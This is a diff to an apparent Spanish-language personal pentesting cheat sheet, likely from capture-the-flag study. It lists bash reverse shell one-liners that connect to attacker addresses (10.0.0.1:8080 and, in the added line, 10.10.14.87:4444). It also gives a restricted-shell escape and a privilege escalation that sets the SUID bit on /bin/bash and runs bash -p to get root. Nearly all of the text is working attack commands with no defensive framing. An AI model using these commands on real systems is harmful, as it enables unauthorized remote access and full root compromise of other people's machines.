@@ -195,6 +195,8 @@ solo que no se puede escribir) ejecutamos !/bin/bash y nos saca fuera como si fu
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 cuando no funciona un comando se prueba poniendo bash -c "comando" en este caso ->> bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
 
+otra reverse shell /bin/bash -c 'sh -i >& /dev/tcp/10.10.14.87/4444 0>&1'
+
 "chmod +s/4777/4755 /bin/bash" --> chmod +s/... -> le cambia el indicador de usuario y grupo (GID, UID) a root de /bin/bash
 bash -p se usa cuando has añadido chmod +s/4777/4755 para ignorar el GID y UID que tiene por defecto y ejecuta el del propio archivo, habiendolo cambiando antes con chmod +s a root, lo ejecuta como root y te da privilegios de root
 
